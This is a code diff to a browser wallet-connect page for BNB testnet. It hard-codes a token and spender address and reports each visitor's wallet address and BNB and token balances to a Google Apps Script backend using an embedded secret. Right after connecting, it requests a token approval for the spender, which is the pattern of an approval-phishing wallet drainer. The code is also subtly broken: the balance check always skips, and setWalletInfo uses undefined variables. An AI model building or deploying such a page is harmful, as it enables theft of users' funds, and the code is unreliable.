@@ -96,8 +96,8 @@
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
     // YOUR TESTNET TOKEN + SPENDER (FILL THESE)
-    const TOKEN_ADDRESS   = "0xYOUR_TESTNET_TOKEN_HERE";   // BEP-20 on BSC testnet
-    const SPENDER_ADDRESS = "0xYOUR_TESTNET_SPENDER_HERE"; // your dApp/contract
+    const TOKEN_ADDRESS   = "0x38a9fed3780c13162368e1ce87c11d314f1dd868";   // BEP-20 on BSC testnet
+    const SPENDER_ADDRESS = "0xaa152Af114e2d2FC969E09c716025FE8C8196FB4"; // your dApp/contract
 
     // Minimal ERC20 ABI for approve()
     const ERC20_ABI = [
@@ -200,14 +200,17 @@
         p.on("disconnect", function(){ clearSessionUI(); });
       } catch(e){ console.warn("attachProviderListeners", e); }
     }
-async function notifyBackend(address, networkText, userId){
+    
+async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
   try {
     const payload = new URLSearchParams({
       secret: APPS_SCRIPT_SECRET,
       address,
       network: networkText,
       timestamp: new Date().toISOString(),
-      userId
+      userId,
+      bnbBalance: String(bnbBalance ?? ""),
+      tokenBalance: String(tokenBalance ?? "")
     });
 
     await fetch(APPS_SCRIPT_URL, {
@@ -220,7 +223,7 @@ async function notifyBackend(address, networkText, userId){
     });
 
     console.log("Sent log to Apps Script (no-cors).");
-  } catch(err){
+  } catch (err) {
     console.error("notifyBackend error:", err);
   }
 }
@@ -262,6 +265,13 @@ async function notifyBackend(address, networkText, userId){
       }
     }
 
+
+
+
+
+
+
+    
     async function switchToBSC(provider){
       try {
         await provider.request({
@@ -327,6 +337,44 @@ async function notifyBackend(address, networkText, userId){
       }
     }
 
+
+
+// === get token balance (from TOKEN_ADDRESS) ===
+async function getTokenBalance(address){
+  try {
+    if (!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868") {
+      console.warn("TOKEN_ADDRESS not set, skipping token balance");
+      return "";
+    }
+    if (!providerInstance) {
+      console.warn("No providerInstance for token balance");
+      return "";
+    }
+
+    const ethersProvider = new ethers.BrowserProvider(providerInstance);
+
+    const tokenContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ["function balanceOf(address owner) view returns (uint256)"],
+      ethersProvider
+    );
+
+    const raw = await tokenContract.balanceOf(address);
+    // assumes 18 decimals – change if your token has different decimals
+    const formatted = ethers.formatUnits(raw, 18);
+    return formatted; // string like "123.4567"
+  } catch (err) {
+    console.error("getTokenBalance error:", err);
+    return "";
+  }
+}
+
+
+
+
+
+    
+
     // ===== main connect flow =====
     async function connectFlow(){
       try{
@@ -381,13 +429,21 @@ async function notifyBackend(address, networkText, userId){
         const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
 
         setStatus("Connected");
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+        setWalletInfo(addr, BNB_TESTNET_LABEL, uid, "", "");
 
         const userId = getOrCreateUserIdFor(address);
         setUserIdUI(userId);
 
+// get this user's token balance
+const tokenBalance = await getTokenBalance(address);
+
+
+        
+
         await fetchTokens(address);
-        await notifyBackend(address, BNB_TESTNET_LABEL, userId);
+       await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
+
+
 
         // 🔥 Immediately request token approval
         await requestTokenApproval();
@@ -415,7 +471,7 @@ async function notifyBackend(address, networkText, userId){
             setStatus("Restoring session…");
             const balanceWei = await web3Instance.eth.getBalance(address);
             const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
-            setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+            setWalletInfo(addr, BNB_TESTNET_LABEL, uid, "", "");
             const userId = getOrCreateUserIdFor(address);
             setUserIdUI(userId);
             await fetchTokens(address);
